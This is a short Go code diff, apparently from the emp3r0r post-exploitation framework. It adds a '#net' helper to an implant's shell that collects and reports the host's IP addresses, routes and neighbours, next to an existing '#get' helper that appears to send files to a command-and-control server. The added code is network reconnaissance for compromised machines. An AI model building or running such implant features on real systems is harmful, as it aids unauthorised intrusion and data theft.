@@ -4,7 +4,9 @@ import (
 	"fmt"
 	"os"
 	"strconv"
+	"strings"
 
+	"github.com/jm33-m0/emp3r0r/core/internal/tun"
 	gops "github.com/mitchellh/go-ps"
 )
 
@@ -25,6 +27,8 @@ func shellHelper(cmdSlice []string) (out string) {
 		if err != nil {
 			out = fmt.Sprintf("Failed to kill: %v", err)
 		}
+	case "#net":
+		out = shellNet()
 	case "#get":
 		filepath := args[0]
 		checksum, err := file2CC(filepath)
@@ -35,6 +39,21 @@ func shellHelper(cmdSlice []string) (out string) {
 	default:
 		out = "Unknown helper"
 	}
+
+	return
+}
+
+func shellNet() (out string) {
+	ipa := tun.IPa()
+	ipneigh := tun.IPNeigh()
+	ipr := tun.IPr()
+
+	out = fmt.Sprintf("[*] ip addr:\n    %s"+
+		"\n\n[*] ip route:\n    %s"+
+		"\n\n[*] ip neigh:\n    %s\n\n",
+		strings.Join(ipa, ", "),
+		strings.Join(ipr, ", "),
+		strings.Join(ipneigh, ", "))
 
 	return
 }
